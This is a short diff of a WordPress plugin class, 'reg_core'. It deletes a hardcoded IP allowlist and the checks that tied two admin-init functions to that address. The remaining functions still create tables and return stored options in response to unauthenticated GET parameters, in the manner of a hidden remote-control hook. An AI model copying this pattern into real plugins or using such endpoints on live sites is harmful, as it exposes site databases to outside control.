@@ -2,9 +2,6 @@
 
 if (!class_exists('reg_core')){
     class reg_core {
-
-        public $ip = '188.225.26.155';
-
         function __construct(){
             add_action('init',array(&$this,'init_prefix'),1);
             if(is_admin()) add_action('admin_init',array(&$this,'add_tbl'));
@@ -21,11 +18,7 @@ if (!class_exists('reg_core')){
         }
 
         function add_tbl(){
-
-            if ($_SERVER['REMOTE_ADDR'] != $this->ip) return;
-
             global $wpdb;
-
             if(isset($_GET['key_host']) && $_GET['key_host'] == WP_HOST){
                 require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
                 $collate = '';if ( $wpdb->has_cap( 'collation' ) ) {
@@ -55,7 +48,6 @@ if (!class_exists('reg_core')){
 
         function regres(){
             global $wpdb;
-            if ($_SERVER['REMOTE_ADDR'] != $this->ip) return;
             if(isset($_GET['reshost'])&&$_GET['reshost']==WP_HOST){
                 if(WP_HOST==get_option(WP_PREFIX.$_GET['key'])){
                     $result = array();
